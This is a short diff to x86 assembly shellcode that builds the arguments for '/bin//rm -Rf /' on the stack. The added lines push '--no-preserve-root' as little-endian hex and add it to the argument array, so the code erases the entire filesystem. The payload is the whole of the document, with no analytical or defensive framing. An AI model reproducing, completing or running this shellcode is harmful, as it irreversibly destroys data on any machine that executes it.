@@ -42,7 +42,15 @@ _start:
 	push eax			; null terminate the array value
 	push byte 0x2f			; "/" onto stack
 	mov edi, esp			; store pointer to "/"
+	push eax			; null terminator onto stack
+	push 0x746f6f72			;
+	push 0x2d657672			;
+	push 0x65736572			; these lines put --no-preserve-root
+	push 0x702d6f6e			; on stack in little endian
+	push word 0x2d2d		; 
+	mov edx, esp			; pointer to end 
 	push eax			; NULL terminator
+	push edx
 	push edi			; pointer to "/"
 	push esi			; pointer to "fR-"
 	push ebx			; pointer to mr//nib/
